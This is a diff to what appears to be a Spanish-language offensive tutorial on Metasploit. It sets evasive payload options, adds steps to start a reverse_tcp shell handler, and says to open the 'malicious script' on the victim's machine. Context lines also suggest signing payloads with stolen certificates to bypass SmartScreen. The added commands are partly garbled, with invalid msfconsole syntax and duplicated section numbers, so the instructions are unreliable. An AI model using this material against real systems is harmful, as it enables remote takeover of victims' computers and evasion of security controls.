@@ -41,6 +41,17 @@ msf6 > set StageEncoder x64/zutto_dekiru
 msf6 > set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0)"
 msf6 > set ExitOnSession false
 ```
+#### **5. Abrir Msfconsole**
+````bash
+msfconsole
+msfconsole /multi/handler
+msfconsole(/multi/handler)> use/windows/shell/reverse_tcp
+````
+#### **6. Ejecutar el payload**
+Configurar el lhost y lport y finalmente lanzar el exploit
+
+#### **7. Finalmente abrir el scrip malicioso en la máquina atacada**
+
 
 #### **5. Técnicas de Entrega (Bypass SmartScreen)**
 • **Firma digital**: Usa signtool con certificados robados/auto-firmados  
